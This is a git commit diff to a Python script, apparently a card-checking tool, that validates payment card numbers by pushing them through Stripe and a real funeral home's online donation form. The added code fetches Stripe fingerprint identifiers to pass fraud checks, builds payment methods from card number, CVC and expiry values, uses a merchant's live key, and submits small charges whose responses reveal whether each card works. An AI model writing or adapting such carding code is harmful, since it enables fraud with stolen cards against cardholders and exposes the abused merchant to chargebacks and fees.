c965eb14135b000f65d4cf3be938b85d114c3b98
Rodamuser08 <rodamuser08@gmail.com>
2025-07-27 08:54:01 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -21,6 +21,36 @@ def Tele(ccx):
 	random_amount1 = random.randint(1, 9)
 	random_amount2 = random.randint(1, 99)
 	
+	cookies = {
+	    'm': '1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b',
+	}
+	
+	headers = {
+	    'authority': 'm.stripe.com',
+	    'accept': '*/*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'text/plain;charset=UTF-8',
+	    # 'cookie': 'm=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b',
+	    'origin': 'https://m.stripe.network',
+	    'referer': 'https://m.stripe.network/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = {
+	    'JTdCJTIybXVpZCUyMiUzQSUyMjhjZDlhYzliLTdhOWEtNGVmNC05NzhmLTg2OWU4YzQ0ZTI5OWVlYjgyYyUyMiUyQyUyMnNpZCUyMiUzQSUyMmE4ODE4MTBkLWQzZjgtNGE0Yi05ZmIxLTJjZjRmOWJmMTgzNmEzMzM0NCUyMiUyQyUyMnVybCUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC51NzZiQ3hkOGhfQktpbEozN1phT01XZzlxaDVPODhEQWRaVkFqYlVxY0trLmtzNnR2ODl3R1VxVmlOaE00VGhpN21xeWZYWVNzUklXY3FfUjBfelBYRmslMkZNYndLYW5CRFdURFIyTTFfV0k0UkN3T0hFT01iRlJ6WlV4NkdMUlNPQkNnJTJGJTIyJTJDJTIyc291cmNlJTIyJTNBJTIybW91c2UtdGltaW5ncy0xMC12MiUyMiUyQyUyMmRhdGElMjIlM0ElNUIlNUQlN0Q': '',
+	}
+	
+	response = requests.post('https://m.stripe.com/6', cookies=cookies, headers=headers, data=data)
+	
+	muid = re.search(r'"muid":"(.*?)"', response.text).group(1)
+	sid = re.search(r'"sid":"(.*?)"', response.text).group(1)
+	
 	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
@@ -37,25 +67,24 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Febc1f502d5%3B+stripe-js-v3%2Febc1f502d5%3B+card-element&referrer=https%3A%2F%2Foneworldimmigration.ca&time_on_page=27760&client_attribution_metadata[client_session_id]=ac3f85a0-ff0e-4b97-834d-d453cb0a5b59&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_F5m5jROJdMKhMezaOOpJBPPN00ybSsneIp'
+	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Faa85643f31%3B+stripe-js-v3%2Faa85643f31%3B+card-element&referrer=https%3A%2F%2Fwww.corriganfunerals.ie&time_on_page=68889&client_attribution_metadata[client_session_id]=085106fc-24c7-4d7d-b07f-cc4d2a5feabf&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51IGU0GIHh0fd2MZ32oi6r6NEUMy1GP19UVxwpXGlx3VagMJJOS0EM4e6moTZ4TUCFdX2HLlqns5dQJEx42rvhlfg003wK95g5r'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': 'NA',
-	    '__stripe_sid': 'NA',
+	    '__stripe_mid': f'{muid}',
+	    '__stripe_sid': f'{sid}',
 	}
 	
 	headers = {
-	    'authority': 'oneworldimmigration.ca',
+	    'authority': 'www.corriganfunerals.ie',
 	    'accept': 'application/json, text/javascript, */*; q=0.01',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=67edb23b-e8ff-44db-891c-4ec11a0dced282829b; __stripe_sid=86206be8-2994-4d2e-a00f-fea5f20d765b2cf1d0',
-	    'origin': 'https://oneworldimmigration.ca',
-	    'referer': 'https://oneworldimmigration.ca/square-payment/',
+	    'origin': 'https://www.corriganfunerals.ie',
+	    'referer': 'https://www.corriganfunerals.ie/help-a-family/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -67,26 +96,23 @@ def Tele(ccx):
 	}
 	
 	data = {
-	    'action': 'wp_full_stripe_inline_payment_charge',
-	    'wpfs-form-name': 'E_SecurePayment_CAD',
+	    'action': 'wp_full_stripe_inline_donation_charge',
+	    'wpfs-form-name': 'help-a-family-with-cost',
 	    'wpfs-form-get-parameters': '%7B%7D',
+	    'wpfs-custom-amount': 'other',
 	    'wpfs-custom-amount-unique': '1',
+	    'wpfs-donation-frequency': 'one-time',
 	    'wpfs-custom-input[]': [
-	        '',
-	        '',
-	        '',
-	        '',
-	        '',
-	        '',
-	        '',
-	        '',
+	        'Rodam User',
+	        '1usd',
+	        '4303000850',
 	    ],
-	    'wpfs-card-holder-email': 'rodamuser09@gmail.com',
+	    'wpfs-card-holder-email': 'rodamuser08@gmail.com',
 	    'wpfs-card-holder-name': 'Rodam User',
 	    'wpfs-stripe-payment-method-id': pm,
 	}
 	
-	response = session.post('https://oneworldimmigration.ca/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+	response = session.post('https://www.corriganfunerals.ie/cfajax', cookies=cookies, headers=headers, data=data)
 	
 	result = re.search(r'"message":"(.*?)"', response.text).group(1)
 		
